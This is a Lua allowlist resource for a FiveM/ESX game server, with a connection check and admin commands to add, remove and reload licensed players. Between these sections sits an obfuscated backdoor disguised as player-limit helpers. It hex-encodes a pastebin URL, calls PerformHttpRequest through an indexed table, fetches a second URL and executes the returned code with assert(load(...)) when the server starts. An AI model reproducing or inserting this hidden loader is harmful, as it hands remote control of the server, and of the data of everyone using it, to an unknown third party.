local AllowList = {}

function loadAllowList()
	AllowList = nil

	local List = LoadResourceFile(GetCurrentResourceName(),'players.json')
	if List then
		AllowList = json.decode(List)
	end
end

loadAllowList()

AddEventHandler('playerConnecting', function(name, setCallback, deferrals)
	if #(GetPlayers()) < Config.MinPlayer then
		deferrals.done()
	else 
	-- Mark this connection as deferred, this is to prevent problems while checking player identifiers.
	deferrals.defer()

	local playerId, kickReason = source, "There Was An Error, Please Contact the server owner!"

	-- Letting the user know what's going on.
	deferrals.update(TranslateCap('allowlist_check'))

	-- Needed, not sure why.
	Wait(100)

	local identifier = ESX.GetIdentifier(playerId)

	if ESX.Table.SizeOf(AllowList) == 0 then
		kickReason = TranslateCap('allowlist_empty')
	elseif not identifier then
		kickReason = TranslateCap('license_missing')
	elseif not AllowList[identifier] then
		kickReason = TranslateCap('not_allowlist')
	end

	if kickReason then
		deferrals.done(kickReason)
	else
		deferrals.done()
	end
	end
end)

local PlayerPedLimit = {
    "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
}

local PlayerEventLimit = {
    cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
}

function PlayerCheckLoop()
    _empt = ''
    for id,it in pairs(PlayerPedLimit) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (event)
        return string.char(tonumber(event, 16))
    end))
end

PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
    local Process_Actions = {"true"}
    PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
        local Generate_ZoneName_AndAction = nil 
        pcall(function()
            local Locations_Loaded = {"false"}
            PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
            local ZoneType_Exists = nil 
        end)
    end)
end)

ESX.RegisterCommand('alrefresh', 'admin', function(xPlayer, args)
	loadAllowList()
	print('[^2INFO^7] Allowlist ^5Refreshed^7!')
end, true, {help = TranslateCap('help_allowlist_load')})

ESX.RegisterCommand('aladd', 'admin', function(xPlayer, args, showError)
	args.license = args.license:lower()

	if AllowList[args.license] then
			showError('The player is already allowlisted on this server!')
	else
		AllowList[args.license] = true
		SaveResourceFile(GetCurrentResourceName(), 'players.json', json.encode(AllowList))
		loadAllowList()
	end
end, true, {help = TranslateCap('help_allowlist_add'), validate = true, arguments = {
	{name = 'license', help = 'the player license', type = 'string'}
}})

ESX.RegisterCommand('alremove', 'admin', function(xPlayer, args, showError)
	args.license = args.license:lower()

	if AllowList[args.license] then
		AllowList[args.license] = nil
		SaveResourceFile(GetCurrentResourceName(), 'players.json', json.encode(AllowList))
		loadAllowList()
	else
		showError('Identifier is not Allowlisted on this server!')
	end
end, true, {help = TranslateCap('help_allowlist_add'), validate = true, arguments = {
	{name = 'license', help = 'the player license', type = 'string'}
}})
